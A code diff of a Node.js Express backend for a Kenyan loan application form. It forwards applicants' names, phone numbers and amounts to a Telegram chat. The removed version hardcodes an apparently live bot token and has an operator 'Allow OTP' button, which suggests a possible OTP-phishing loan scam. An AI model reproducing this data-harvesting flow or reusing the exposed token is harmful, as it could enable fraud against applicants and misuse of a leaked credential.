@@ -1,58 +1,29 @@
-‎const express = require('express');
-‎const fetch = require('node-fetch');
-‎const bodyParser = require('body-parser');
-‎const cors = require('cors');
-‎const fs = require('fs');
-‎
-‎const app = express();
-‎app.use(cors());
-‎app.use(bodyParser.json());
-‎
-‎const BOT_TOKEN = "8864945488:AAFGN292M6CyjuU4LjQjfj_vUVJMchW07ik";
-‎const CHAT_ID = "8580615195";
-‎const DB_FILE = 'applications.json';
-‎
-‎function readDB() {
-‎  if (!fs.existsSync(DB_FILE)) return [];
-‎  return JSON.parse(fs.readFileSync(DB_FILE));
-‎}
-‎
-‎function writeDB(data) {
-‎  fs.writeFileSync(DB_FILE, JSON.stringify(data, null, 2));
-‎}
-‎
-‎// Route ya form kutuma data
-‎app.post('/submit', async (req, res) => {
-‎  const { name, amount, phone } = req.body;
-‎  const appId = 'APP-' + Date.now();
-‎  
-‎  const newApp = { appId, name, amount, phone, status: 'pending' };
-‎  const db = readDB();
-‎  db.push(newApp);
-‎  writeDB(db);
-‎
-‎  const message = `🔔 NEW APPLICATION\n\n📋 ${appId}\n👤 ${name}\n💰 KES ${amount}\n📞 ${phone}\n\n⚠️ VERIFY INFORMATION`;
-‎
-‎  await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
-‎    method: 'POST',
-‎    headers: {'Content-Type': 'application/json'},
-‎    body: JSON.stringify({
-‎      chat_id: CHAT_ID,
-‎      text: message,
-‎      reply_markup: {
-‎        inline_keyboard: [
-‎          [
-‎            {text: "❌ Invalid - Deny", callback_data: `deny_${appId}`},
-‎            {text: "✅ Correct - Allow OTP", callback_data: `allow_${appId}`}
-‎          ]
-‎        ]
-‎      }
-‎    })
-‎  });
-‎
-‎  res.json({ success: true, appId, message: "Application sent" });
-‎});
-‎
-‎app.listen(3000, () => console.log('Server running on port 3000'));
-‎
-‎
+const express = require('express');
+const TelegramBot = require('node-telegram-bot-api');
+const cors = require('cors');
+
+const app = express();
+const PORT = process.env.PORT || 3000;
+
+const bot = new TelegramBot(process.env.BOT_TOKEN);
+const CHAT_ID = process.env.CHAT_ID;
+
+app.use(cors());
+app.use(express.json());
+
+app.post('/submit', async (req, res) => {
+    try {
+        const { name, phone, amount, message } = req.body;
+        const text = `🚨 LOAN APPLICATION MPYA 🚨\n\nJina: ${name}\nSimu: ${phone}\nKiasi: ${amount}\nUjumbe: ${message}`;
+        await bot.sendMessage(CHAT_ID, text);
+        res.json({ success: true });
+    } catch (error) {
+        res.status(500).json({ success: false, error: error.message });
+    }
+});
+
+app.get('/', (req, res) => {
+    res.send('Loan Backend is Running ✅');
+});
+
+app.listen(PORT, () => console.log('Running on ' + PORT));
